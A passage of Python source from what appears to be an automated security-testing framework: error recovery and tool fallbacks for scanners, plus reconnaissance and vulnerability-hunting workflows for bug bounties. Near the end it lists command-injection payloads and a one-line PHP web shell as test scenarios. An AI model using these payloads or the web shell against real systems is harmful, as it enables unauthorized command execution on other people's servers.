    estimated_time: int  # seconds

class IntelligentErrorHandler:
    """Advanced error handling with automatic recovery strategies"""

    def __init__(self):
        self.error_patterns = self._initialize_error_patterns()
        self.recovery_strategies = self._initialize_recovery_strategies()
        self.tool_alternatives = self._initialize_tool_alternatives()
        self.parameter_adjustments = self._initialize_parameter_adjustments()
        self.error_history = []
        self.max_history_size = 1000

    def _initialize_error_patterns(self) -> Dict[str, ErrorType]:
        """Initialize error pattern recognition"""
        return {
            # Timeout patterns
            r"timeout|timed out|connection timeout|read timeout": ErrorType.TIMEOUT,
            r"operation timed out|command timeout": ErrorType.TIMEOUT,

            # Permission patterns
            r"permission denied|access denied|forbidden|not authorized": ErrorType.PERMISSION_DENIED,
            r"sudo required|root required|insufficient privileges": ErrorType.PERMISSION_DENIED,

            # Network patterns
            r"network unreachable|host unreachable|no route to host": ErrorType.NETWORK_UNREACHABLE,
            r"connection refused|connection reset|network error": ErrorType.NETWORK_UNREACHABLE,

            # Rate limiting patterns
            r"rate limit|too many requests|throttled|429": ErrorType.RATE_LIMITED,
            r"request limit exceeded|quota exceeded": ErrorType.RATE_LIMITED,

            # Tool not found patterns
            r"command not found|no such file or directory|not found": ErrorType.TOOL_NOT_FOUND,
            r"executable not found|binary not found": ErrorType.TOOL_NOT_FOUND,

            # Parameter patterns
            r"invalid argument|invalid option|unknown option": ErrorType.INVALID_PARAMETERS,
            r"bad parameter|invalid parameter|syntax error": ErrorType.INVALID_PARAMETERS,

            # Resource patterns
            r"out of memory|memory error|disk full|no space left": ErrorType.RESOURCE_EXHAUSTED,
            r"resource temporarily unavailable|too many open files": ErrorType.RESOURCE_EXHAUSTED,

            # Authentication patterns
            r"authentication failed|login failed|invalid credentials": ErrorType.AUTHENTICATION_FAILED,
            r"unauthorized|invalid token|expired token": ErrorType.AUTHENTICATION_FAILED,

            # Target patterns
            r"target unreachable|target not responding|target down": ErrorType.TARGET_UNREACHABLE,
            r"host not found|dns resolution failed": ErrorType.TARGET_UNREACHABLE,

            # Parsing patterns
            r"parse error|parsing failed|invalid format|malformed": ErrorType.PARSING_ERROR,
            r"json decode error|xml parse error|invalid json": ErrorType.PARSING_ERROR
        }

    def _initialize_recovery_strategies(self) -> Dict[ErrorType, List[RecoveryStrategy]]:
        """Initialize recovery strategies for different error types"""
        return {
            ErrorType.TIMEOUT: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 5, "max_delay": 60},
                    max_attempts=3,
                    backoff_multiplier=2.0,
                    success_probability=0.7,
                    estimated_time=30
                ),
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_REDUCED_SCOPE,
                    parameters={"reduce_threads": True, "reduce_timeout": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.8,
                    estimated_time=45
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"prefer_faster_tools": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.6,
                    estimated_time=60
                )
            ],
            ErrorType.PERMISSION_DENIED: [
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Privilege escalation required", "urgency": "medium"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=300
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"require_no_privileges": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.5,
                    estimated_time=30
                )
            ],
            ErrorType.NETWORK_UNREACHABLE: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 10, "max_delay": 120},
                    max_attempts=3,
                    backoff_multiplier=2.0,
                    success_probability=0.6,
                    estimated_time=60
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"prefer_offline_tools": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.4,
                    estimated_time=30
                )
            ],
            ErrorType.RATE_LIMITED: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 30, "max_delay": 300},
                    max_attempts=5,
                    backoff_multiplier=1.5,
                    success_probability=0.9,
                    estimated_time=180
                ),
                RecoveryStrategy(
                    action=RecoveryAction.ADJUST_PARAMETERS,
                    parameters={"reduce_rate": True, "increase_delays": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.8,
                    estimated_time=120
                )
            ],
            ErrorType.TOOL_NOT_FOUND: [
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"find_equivalent": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.7,
                    estimated_time=15
                ),
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Tool installation required", "urgency": "low"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=600
                )
            ],
            ErrorType.INVALID_PARAMETERS: [
                RecoveryStrategy(
                    action=RecoveryAction.ADJUST_PARAMETERS,
                    parameters={"use_defaults": True, "remove_invalid": True},
                    max_attempts=3,
                    backoff_multiplier=1.0,
                    success_probability=0.8,
                    estimated_time=10
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"simpler_interface": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.6,
                    estimated_time=30
                )
            ],
            ErrorType.RESOURCE_EXHAUSTED: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_REDUCED_SCOPE,
                    parameters={"reduce_memory": True, "reduce_threads": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.7,
                    estimated_time=60
                ),
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 60, "max_delay": 300},
                    max_attempts=2,
                    backoff_multiplier=2.0,
                    success_probability=0.5,
                    estimated_time=180
                )
            ],
            ErrorType.AUTHENTICATION_FAILED: [
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Authentication credentials required", "urgency": "high"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=300
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"no_auth_required": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.4,
                    estimated_time=30
                )
            ],
            ErrorType.TARGET_UNREACHABLE: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 15, "max_delay": 180},
                    max_attempts=3,
                    backoff_multiplier=2.0,
                    success_probability=0.6,
                    estimated_time=90
                ),
                RecoveryStrategy(
                    action=RecoveryAction.GRACEFUL_DEGRADATION,
                    parameters={"skip_target": True, "continue_with_others": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=1.0,
                    estimated_time=5
                )
            ],
            ErrorType.PARSING_ERROR: [
                RecoveryStrategy(
                    action=RecoveryAction.ADJUST_PARAMETERS,
                    parameters={"change_output_format": True, "add_parsing_flags": True},
                    max_attempts=2,
                    backoff_multiplier=1.0,
                    success_probability=0.7,
                    estimated_time=20
                ),
                RecoveryStrategy(
                    action=RecoveryAction.SWITCH_TO_ALTERNATIVE_TOOL,
                    parameters={"better_output_format": True},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.6,
                    estimated_time=30
                )
            ],
            ErrorType.UNKNOWN: [
                RecoveryStrategy(
                    action=RecoveryAction.RETRY_WITH_BACKOFF,
                    parameters={"initial_delay": 5, "max_delay": 30},
                    max_attempts=2,
                    backoff_multiplier=2.0,
                    success_probability=0.3,
                    estimated_time=45
                ),
                RecoveryStrategy(
                    action=RecoveryAction.ESCALATE_TO_HUMAN,
                    parameters={"message": "Unknown error encountered", "urgency": "medium"},
                    max_attempts=1,
                    backoff_multiplier=1.0,
                    success_probability=0.9,
                    estimated_time=300
                )
            ]
        }

    def _initialize_tool_alternatives(self) -> Dict[str, List[str]]:
        """Initialize alternative tools for fallback scenarios"""
        return {
            # Network scanning alternatives
            "nmap": ["rustscan", "masscan", "zmap"],
            "rustscan": ["nmap", "masscan"],
            "masscan": ["nmap", "rustscan", "zmap"],

            # Directory/file discovery alternatives
            "gobuster": ["feroxbuster", "dirsearch", "ffuf", "dirb"],
            "feroxbuster": ["gobuster", "dirsearch", "ffuf"],
            "dirsearch": ["gobuster", "feroxbuster", "ffuf"],
            "ffuf": ["gobuster", "feroxbuster", "dirsearch"],

            # Vulnerability scanning alternatives
            "nuclei": ["jaeles", "nikto", "w3af"],
            "jaeles": ["nuclei", "nikto"],
            "nikto": ["nuclei", "jaeles", "w3af"],

            # Web crawling alternatives
            "katana": ["gau", "waybackurls", "hakrawler"],
            "gau": ["katana", "waybackurls", "hakrawler"],
            "waybackurls": ["gau", "katana", "hakrawler"],

            # Parameter discovery alternatives
            "arjun": ["paramspider", "x8", "ffuf"],
            "paramspider": ["arjun", "x8"],
            "x8": ["arjun", "paramspider"],

            # SQL injection alternatives
            "sqlmap": ["sqlninja", "jsql-injection"],

            # XSS testing alternatives
            "dalfox": ["xsser", "xsstrike"],

            # Subdomain enumeration alternatives
            "subfinder": ["amass", "assetfinder", "findomain"],
            "amass": ["subfinder", "assetfinder", "findomain"],
            "assetfinder": ["subfinder", "amass", "findomain"],

            # Cloud security alternatives
            "prowler": ["scout-suite", "cloudmapper"],
            "scout-suite": ["prowler", "cloudmapper"],

            # Container security alternatives
            "trivy": ["clair", "docker-bench-security"],
            "clair": ["trivy", "docker-bench-security"],

            # Binary analysis alternatives
            "ghidra": ["radare2", "ida", "binary-ninja"],
            "radare2": ["ghidra", "objdump", "gdb"],
            "gdb": ["radare2", "lldb"],

            # Exploitation alternatives
            "pwntools": ["ropper", "ropgadget"],
            "ropper": ["ropgadget", "pwntools"],
            "ropgadget": ["ropper", "pwntools"]
        }

    def _initialize_parameter_adjustments(self) -> Dict[str, Dict[ErrorType, Dict[str, Any]]]:
        """Initialize parameter adjustments for different error types and tools"""
        return {
            "nmap": {
                ErrorType.TIMEOUT: {"timing": "-T2", "reduce_ports": True},
                ErrorType.RATE_LIMITED: {"timing": "-T1", "delay": "1000ms"},
                ErrorType.RESOURCE_EXHAUSTED: {"max_parallelism": "10"}
            },
            "gobuster": {
                ErrorType.TIMEOUT: {"threads": "10", "timeout": "30s"},
                ErrorType.RATE_LIMITED: {"threads": "5", "delay": "1s"},
                ErrorType.RESOURCE_EXHAUSTED: {"threads": "5"}
            },
            "nuclei": {
                ErrorType.TIMEOUT: {"concurrency": "10", "timeout": "30"},
                ErrorType.RATE_LIMITED: {"rate-limit": "10", "concurrency": "5"},
                ErrorType.RESOURCE_EXHAUSTED: {"concurrency": "5"}
            },
            "feroxbuster": {
                ErrorType.TIMEOUT: {"threads": "10", "timeout": "30"},
                ErrorType.RATE_LIMITED: {"threads": "5", "rate-limit": "10"},
                ErrorType.RESOURCE_EXHAUSTED: {"threads": "5"}
            },
            "ffuf": {
                ErrorType.TIMEOUT: {"threads": "10", "timeout": "30"},
                ErrorType.RATE_LIMITED: {"threads": "5", "rate": "10"},
                ErrorType.RESOURCE_EXHAUSTED: {"threads": "5"}
            }
        }

    def classify_error(self, error_message: str, exception: Exception = None) -> ErrorType:
        """Classify error based on message and exception type"""
        error_text = error_message.lower()

        # Check exception type first
        if exception:
            if isinstance(exception, TimeoutError):
                return ErrorType.TIMEOUT
            elif isinstance(exception, PermissionError):
                return ErrorType.PERMISSION_DENIED
            elif isinstance(exception, ConnectionError):
                return ErrorType.NETWORK_UNREACHABLE
            elif isinstance(exception, FileNotFoundError):
                return ErrorType.TOOL_NOT_FOUND

        # Check error patterns
        for pattern, error_type in self.error_patterns.items():
            if re.search(pattern, error_text, re.IGNORECASE):
                return error_type

        return ErrorType.UNKNOWN

    def handle_tool_failure(self, tool: str, error: Exception, context: Dict[str, Any]) -> RecoveryStrategy:
        """Determine best recovery action for tool failures"""
        error_message = str(error)
        error_type = self.classify_error(error_message, error)

        # Create error context
        error_context = ErrorContext(
            tool_name=tool,
            target=context.get('target', 'unknown'),
            parameters=context.get('parameters', {}),
            error_type=error_type,
            error_message=error_message,
            attempt_count=context.get('attempt_count', 1),
            timestamp=datetime.now(),
            stack_trace=traceback.format_exc(),
            system_resources=self._get_system_resources()
        )

        # Add to error history
        self._add_to_history(error_context)

        # Get recovery strategies for this error type
        strategies = self.recovery_strategies.get(error_type, self.recovery_strategies[ErrorType.UNKNOWN])

        # Select best strategy based on context
        best_strategy = self._select_best_strategy(strategies, error_context)

        error_message = f'{error_type.value} - Applying {best_strategy.action.value}'
        logger.warning(f"{ModernVisualEngine.format_error_card('RECOVERY', tool, error_message)}")

        return best_strategy

    def _select_best_strategy(self, strategies: List[RecoveryStrategy], context: ErrorContext) -> RecoveryStrategy:
        """Select the best recovery strategy based on context"""
        # Filter strategies based on attempt count
        viable_strategies = [s for s in strategies if context.attempt_count <= s.max_attempts]

        if not viable_strategies:
            # If all strategies exhausted, escalate to human
            return RecoveryStrategy(
                action=RecoveryAction.ESCALATE_TO_HUMAN,
                parameters={"message": f"All recovery strategies exhausted for {context.tool_name}", "urgency": "high"},
                max_attempts=1,
                backoff_multiplier=1.0,
                success_probability=0.9,
                estimated_time=300
            )

        # Score strategies based on success probability and estimated time
        scored_strategies = []
        for strategy in viable_strategies:
            # Adjust success probability based on previous failures
            adjusted_probability = strategy.success_probability * (0.9 ** (context.attempt_count - 1))

            # Prefer strategies with higher success probability and lower time
            score = adjusted_probability - (strategy.estimated_time / 1000.0)
            scored_strategies.append((score, strategy))

        # Return strategy with highest score
        scored_strategies.sort(key=lambda x: x[0], reverse=True)
        return scored_strategies[0][1]

    def auto_adjust_parameters(self, tool: str, error_type: ErrorType, original_params: Dict[str, Any]) -> Dict[str, Any]:
        """Automatically adjust tool parameters based on error patterns"""
        adjustments = self.parameter_adjustments.get(tool, {}).get(error_type, {})

        if not adjustments:
            # Generic adjustments based on error type
            if error_type == ErrorType.TIMEOUT:
                adjustments = {"timeout": "60", "threads": "5"}
            elif error_type == ErrorType.RATE_LIMITED:
                adjustments = {"delay": "2s", "threads": "3"}
            elif error_type == ErrorType.RESOURCE_EXHAUSTED:
                adjustments = {"threads": "3", "memory_limit": "1G"}

        # Apply adjustments to original parameters
        adjusted_params = original_params.copy()
        adjusted_params.update(adjustments)

        adjustment_info = f'Parameters adjusted: {adjustments}'
        logger.info(f"{ModernVisualEngine.format_tool_status(tool, 'RECOVERY', adjustment_info)}")

        return adjusted_params

    def get_alternative_tool(self, failed_tool: str, context: Dict[str, Any]) -> Optional[str]:
        """Get alternative tool for failed tool"""
        alternatives = self.tool_alternatives.get(failed_tool, [])

        if not alternatives:
            return None

        # Filter alternatives based on context requirements
        filtered_alternatives = []
        for alt in alternatives:
            if context.get('require_no_privileges') and alt in ['nmap', 'masscan']:
                continue  # Skip tools that typically require privileges
            if context.get('prefer_faster_tools') and alt in ['amass', 'w3af']:
                continue  # Skip slower tools
            filtered_alternatives.append(alt)

        if not filtered_alternatives:
            filtered_alternatives = alternatives

        # Return first available alternative
        return filtered_alternatives[0] if filtered_alternatives else None

    def escalate_to_human(self, context: ErrorContext, urgency: str = "medium") -> Dict[str, Any]:
        """Escalate complex errors to human operator with full context"""
        escalation_data = {
            "timestamp": context.timestamp.isoformat(),
            "tool": context.tool_name,
            "target": context.target,
            "error_type": context.error_type.value,
            "error_message": context.error_message,
            "attempt_count": context.attempt_count,
            "urgency": urgency,
            "suggested_actions": self._get_human_suggestions(context),
            "context": {
                "parameters": context.parameters,
                "system_resources": context.system_resources,
                "recent_errors": [e.error_message for e in context.previous_errors[-5:]]
            }
        }

        # Log escalation with enhanced formatting
        logger.error(f"{ModernVisualEngine.format_error_card('CRITICAL', context.tool_name, context.error_message, 'HUMAN ESCALATION REQUIRED')}")
        logger.error(f"{ModernVisualEngine.format_highlighted_text('ESCALATION DETAILS', 'RED')}")
        logger.error(f"{json.dumps(escalation_data, indent=2)}")

        return escalation_data

    def _get_human_suggestions(self, context: ErrorContext) -> List[str]:
        """Get human-readable suggestions for error resolution"""
        suggestions = []

        if context.error_type == ErrorType.PERMISSION_DENIED:
            suggestions.extend([
                "Run the command with sudo privileges",
                "Check file/directory permissions",
                "Verify user is in required groups"
            ])
        elif context.error_type == ErrorType.TOOL_NOT_FOUND:
            suggestions.extend([
                f"Install {context.tool_name} using package manager",
                "Check if tool is in PATH",
                "Verify tool installation"
            ])
        elif context.error_type == ErrorType.NETWORK_UNREACHABLE:
            suggestions.extend([
                "Check network connectivity",
                "Verify target is accessible",
                "Check firewall rules"
            ])
        elif context.error_type == ErrorType.RATE_LIMITED:
            suggestions.extend([
                "Wait before retrying",
                "Use slower scan rates",
                "Check API rate limits"
            ])
        else:
            suggestions.append("Review error details and logs")

        return suggestions

    def _get_system_resources(self) -> Dict[str, Any]:
        """Get current system resource information"""
        try:
            return {
                "cpu_percent": psutil.cpu_percent(),
                "memory_percent": psutil.virtual_memory().percent,
                "disk_percent": psutil.disk_usage('/').percent,
                "load_average": os.getloadavg() if hasattr(os, 'getloadavg') else None,
                "active_processes": len(psutil.pids())
            }
        except Exception:
            return {"error": "Unable to get system resources"}

    def _add_to_history(self, error_context: ErrorContext):
        """Add error context to history"""
        self.error_history.append(error_context)

        # Maintain history size limit
        if len(self.error_history) > self.max_history_size:
            self.error_history = self.error_history[-self.max_history_size:]

    def get_error_statistics(self) -> Dict[str, Any]:
        """Get error statistics for monitoring"""
        if not self.error_history:
            return {"total_errors": 0}

        error_counts = {}
        tool_errors = {}
        recent_errors = []

        # Count errors by type and tool
        for error in self.error_history:
            error_type = error.error_type.value
            tool = error.tool_name

            error_counts[error_type] = error_counts.get(error_type, 0) + 1
            tool_errors[tool] = tool_errors.get(tool, 0) + 1

            # Recent errors (last hour)
            if (datetime.now() - error.timestamp).total_seconds() < 3600:
                recent_errors.append({
                    "tool": tool,
                    "error_type": error_type,
                    "timestamp": error.timestamp.isoformat()
                })

        return {
            "total_errors": len(self.error_history),
            "error_counts_by_type": error_counts,
            "error_counts_by_tool": tool_errors,
            "recent_errors_count": len(recent_errors),
            "recent_errors": recent_errors[-10:]  # Last 10 recent errors
        }

class GracefulDegradation:
    """Ensure system continues operating even with partial tool failures"""

    def __init__(self):
        self.fallback_chains = self._initialize_fallback_chains()
        self.critical_operations = self._initialize_critical_operations()

    def _initialize_fallback_chains(self) -> Dict[str, List[List[str]]]:
        """Initialize fallback tool chains for critical operations"""
        return {
            "network_discovery": [
                ["nmap", "rustscan", "masscan"],
                ["rustscan", "nmap"],
                ["ping", "telnet"]  # Basic fallback
            ],
            "web_discovery": [
                ["gobuster", "feroxbuster", "dirsearch"],
                ["feroxbuster", "ffuf"],
                ["curl", "wget"]  # Basic fallback
            ],
            "vulnerability_scanning": [
                ["nuclei", "jaeles", "nikto"],
                ["nikto", "w3af"],
                ["curl"]  # Basic manual testing
            ],
            "subdomain_enumeration": [
                ["subfinder", "amass", "assetfinder"],
                ["amass", "findomain"],
                ["dig", "nslookup"]  # Basic DNS tools
            ],
            "parameter_discovery": [
                ["arjun", "paramspider", "x8"],
                ["ffuf", "wfuzz"],
                ["manual_testing"]  # Manual parameter testing
            ]
        }

    def _initialize_critical_operations(self) -> Set[str]:
        """Initialize set of critical operations that must not fail completely"""
        return {
            "network_discovery",
            "web_discovery",
            "vulnerability_scanning",
            "subdomain_enumeration"
        }

    def create_fallback_chain(self, operation: str, failed_tools: List[str] = None) -> List[str]:
        """Create fallback tool chain for critical operations"""
        if failed_tools is None:
            failed_tools = []

        chains = self.fallback_chains.get(operation, [])

        # Find first chain that doesn't contain failed tools
        for chain in chains:
            viable_chain = [tool for tool in chain if tool not in failed_tools]
            if viable_chain:
                logger.info(f"🔄 Fallback chain for {operation}: {viable_chain}")
                return viable_chain

        # If no viable chain found, return basic fallback
        basic_fallbacks = {
            "network_discovery": ["ping"],
            "web_discovery": ["curl"],
            "vulnerability_scanning": ["curl"],
            "subdomain_enumeration": ["dig"]
        }

        fallback = basic_fallbacks.get(operation, ["manual_testing"])
        logger.warning(f"⚠️  Using basic fallback for {operation}: {fallback}")
        return fallback

    def handle_partial_failure(self, operation: str, partial_results: Dict[str, Any],
                             failed_components: List[str]) -> Dict[str, Any]:
        """Handle partial results and fill gaps with alternative methods"""

        enhanced_results = partial_results.copy()
        enhanced_results["degradation_info"] = {
            "operation": operation,
            "failed_components": failed_components,
            "partial_success": True,
            "fallback_applied": True,
            "timestamp": datetime.now().isoformat()
        }

        # Try to fill gaps based on operation type
        if operation == "network_discovery" and "open_ports" not in partial_results:
            # Try basic port check if full scan failed
            enhanced_results["open_ports"] = self._basic_port_check(partial_results.get("target"))

        elif operation == "web_discovery" and "directories" not in partial_results:
            # Try basic directory check
            enhanced_results["directories"] = self._basic_directory_check(partial_results.get("target"))

        elif operation == "vulnerability_scanning" and "vulnerabilities" not in partial_results:
            # Provide basic security headers check
            enhanced_results["vulnerabilities"] = self._basic_security_check(partial_results.get("target"))

        # Add recommendations for manual follow-up
        enhanced_results["manual_recommendations"] = self._get_manual_recommendations(
            operation, failed_components
        )

        logger.info(f"🛡️  Graceful degradation applied for {operation}")
        return enhanced_results

    def _basic_port_check(self, target: str) -> List[int]:
        """Basic port connectivity check"""
        if not target:
            return []

        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995]
        open_ports = []

        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                result = sock.connect_ex((target, port))
                if result == 0:
                    open_ports.append(port)
                sock.close()
            except Exception:
                continue

        return open_ports

    def _basic_directory_check(self, target: str) -> List[str]:
        """Basic directory existence check"""
        if not target:
            return []

        common_dirs = ["/admin", "/login", "/api", "/wp-admin", "/phpmyadmin", "/robots.txt"]
        found_dirs = []

        for directory in common_dirs:
            try:
                url = f"{target.rstrip('/')}{directory}"
                response = requests.head(url, timeout=5, allow_redirects=True)
                if response.status_code in [200, 301, 302, 403]:
                    found_dirs.append(directory)
            except Exception:
                continue

        return found_dirs

    def _basic_security_check(self, target: str) -> List[Dict[str, Any]]:
        """Basic security headers check"""
        if not target:
            return []

        vulnerabilities = []

        try:
            response = requests.get(target, timeout=10)
            headers = response.headers

            # Check for missing security headers
            security_headers = {
                "X-Frame-Options": "Clickjacking protection missing",
                "X-Content-Type-Options": "MIME type sniffing protection missing",
                "X-XSS-Protection": "XSS protection missing",
                "Strict-Transport-Security": "HTTPS enforcement missing",
                "Content-Security-Policy": "Content Security Policy missing"
            }

            for header, description in security_headers.items():
                if header not in headers:
                    vulnerabilities.append({
                        "type": "missing_security_header",
                        "severity": "medium",
                        "description": description,
                        "header": header
                    })

        except Exception as e:
            vulnerabilities.append({
                "type": "connection_error",
                "severity": "info",
                "description": f"Could not perform basic security check: {str(e)}"
            })

        return vulnerabilities

    def _get_manual_recommendations(self, operation: str, failed_components: List[str]) -> List[str]:
        """Get manual recommendations for failed operations"""
        recommendations = []

        base_recommendations = {
            "network_discovery": [
                "Manually test common ports using telnet or nc",
                "Check for service banners manually",
                "Use online port scanners as alternative"
            ],
            "web_discovery": [
                "Manually browse common directories",
                "Check robots.txt and sitemap.xml",
                "Use browser developer tools for endpoint discovery"
            ],
            "vulnerability_scanning": [
                "Manually test for common vulnerabilities",
                "Check security headers using browser tools",
                "Perform manual input validation testing"
            ],
            "subdomain_enumeration": [
                "Use online subdomain discovery tools",
                "Check certificate transparency logs",
                "Perform manual DNS queries"
            ]
        }

        recommendations.extend(base_recommendations.get(operation, []))

        # Add specific recommendations based on failed components
        for component in failed_components:
            if component == "nmap":
                recommendations.append("Consider using online port scanners")
            elif component == "gobuster":
                recommendations.append("Try manual directory browsing")
            elif component == "nuclei":
                recommendations.append("Perform manual vulnerability testing")

        return recommendations

    def is_critical_operation(self, operation: str) -> bool:
        """Check if operation is critical and requires fallback"""
        return operation in self.critical_operations

# Global error handler and degradation manager instances
error_handler = IntelligentErrorHandler()
degradation_manager = GracefulDegradation()

# ============================================================================
# BUG BOUNTY HUNTING SPECIALIZED WORKFLOWS (v6.0 ENHANCEMENT)
# ============================================================================

@dataclass
class BugBountyTarget:
    """Bug bounty target information"""
    domain: str
    scope: List[str] = field(default_factory=list)
    out_of_scope: List[str] = field(default_factory=list)
    program_type: str = "web"  # web, api, mobile, iot
    priority_vulns: List[str] = field(default_factory=lambda: ["rce", "sqli", "xss", "idor", "ssrf"])
    bounty_range: str = "unknown"

class BugBountyWorkflowManager:
    """Specialized workflow manager for bug bounty hunting"""

    def __init__(self):
        self.high_impact_vulns = {
            "rce": {"priority": 10, "tools": ["nuclei", "jaeles", "sqlmap"], "payloads": "command_injection"},
            "sqli": {"priority": 9, "tools": ["sqlmap", "nuclei"], "payloads": "sql_injection"},
            "ssrf": {"priority": 8, "tools": ["nuclei", "ffuf"], "payloads": "ssrf"},
            "idor": {"priority": 8, "tools": ["arjun", "paramspider", "ffuf"], "payloads": "idor"},
            "xss": {"priority": 7, "tools": ["dalfox", "nuclei"], "payloads": "xss"},
            "lfi": {"priority": 7, "tools": ["ffuf", "nuclei"], "payloads": "lfi"},
            "xxe": {"priority": 6, "tools": ["nuclei"], "payloads": "xxe"},
            "csrf": {"priority": 5, "tools": ["nuclei"], "payloads": "csrf"}
        }

        self.reconnaissance_tools = [
            {"tool": "amass", "phase": "subdomain_enum", "priority": 1},
            {"tool": "subfinder", "phase": "subdomain_enum", "priority": 2},
            {"tool": "httpx", "phase": "http_probe", "priority": 3},
            {"tool": "katana", "phase": "crawling", "priority": 4},
            {"tool": "gau", "phase": "url_discovery", "priority": 5},
            {"tool": "waybackurls", "phase": "url_discovery", "priority": 6},
            {"tool": "paramspider", "phase": "parameter_discovery", "priority": 7},
            {"tool": "arjun", "phase": "parameter_discovery", "priority": 8}
        ]

    def create_reconnaissance_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create comprehensive reconnaissance workflow for bug bounty"""
        workflow = {
            "target": target.domain,
            "phases": [],
            "estimated_time": 0,
            "tools_count": 0
        }

        # Phase 1: Subdomain Discovery
        subdomain_phase = {
            "name": "subdomain_discovery",
            "description": "Comprehensive subdomain enumeration",
            "tools": [
                {"tool": "amass", "params": {"domain": target.domain, "mode": "enum"}},
                {"tool": "subfinder", "params": {"domain": target.domain, "silent": True}},
                {"tool": "assetfinder", "params": {"domain": target.domain}}
            ],
            "expected_outputs": ["subdomains.txt"],
            "estimated_time": 300
        }
        workflow["phases"].append(subdomain_phase)

        # Phase 2: HTTP Service Discovery
        http_phase = {
            "name": "http_service_discovery",
            "description": "Identify live HTTP services",
            "tools": [
                {"tool": "httpx", "params": {"probe": True, "tech_detect": True, "status_code": True}},
                {"tool": "nuclei", "params": {"tags": "tech", "severity": "info"}}
            ],
            "expected_outputs": ["live_hosts.txt", "technologies.json"],
            "estimated_time": 180
        }
        workflow["phases"].append(http_phase)

        # Phase 3: Content Discovery
        content_phase = {
            "name": "content_discovery",
            "description": "Discover hidden content and endpoints",
            "tools": [
                {"tool": "katana", "params": {"depth": 3, "js_crawl": True}},
                {"tool": "gau", "params": {"include_subs": True}},
                {"tool": "waybackurls", "params": {}},
                {"tool": "dirsearch", "params": {"extensions": "php,html,js,txt,json,xml"}}
            ],
            "expected_outputs": ["endpoints.txt", "js_files.txt"],
            "estimated_time": 600
        }
        workflow["phases"].append(content_phase)

        # Phase 4: Parameter Discovery
        param_phase = {
            "name": "parameter_discovery",
            "description": "Discover hidden parameters",
            "tools": [
                {"tool": "paramspider", "params": {"level": 2}},
                {"tool": "arjun", "params": {"method": "GET,POST", "stable": True}},
                {"tool": "x8", "params": {"method": "GET"}}
            ],
            "expected_outputs": ["parameters.txt"],
            "estimated_time": 240
        }
        workflow["phases"].append(param_phase)

        # Calculate totals
        workflow["estimated_time"] = sum(phase["estimated_time"] for phase in workflow["phases"])
        workflow["tools_count"] = sum(len(phase["tools"]) for phase in workflow["phases"])

        return workflow

    def create_vulnerability_hunting_workflow(self, target: BugBountyTarget) -> Dict[str, Any]:
        """Create vulnerability hunting workflow prioritized by impact"""
        workflow = {
            "target": target.domain,
            "vulnerability_tests": [],
            "estimated_time": 0,
            "priority_score": 0
        }

        # Sort vulnerabilities by priority
        sorted_vulns = sorted(target.priority_vulns,
                            key=lambda v: self.high_impact_vulns.get(v, {}).get("priority", 0),
                            reverse=True)

        for vuln_type in sorted_vulns:
            if vuln_type in self.high_impact_vulns:
                vuln_config = self.high_impact_vulns[vuln_type]

                vuln_test = {
                    "vulnerability_type": vuln_type,
                    "priority": vuln_config["priority"],
                    "tools": vuln_config["tools"],
                    "payload_type": vuln_config["payloads"],
                    "test_scenarios": self._get_test_scenarios(vuln_type),
                    "estimated_time": vuln_config["priority"] * 30  # Higher priority = more time
                }

                workflow["vulnerability_tests"].append(vuln_test)
                workflow["estimated_time"] += vuln_test["estimated_time"]
                workflow["priority_score"] += vuln_config["priority"]

        return workflow

    def _get_test_scenarios(self, vuln_type: str) -> List[Dict[str, Any]]:
        """Get specific test scenarios for vulnerability types"""
        scenarios = {
            "rce": [
                {"name": "Command Injection", "payloads": ["$(whoami)", "`id`", ";ls -la"]},
                {"name": "Code Injection", "payloads": ["<?php system($_GET['cmd']); ?>"]},
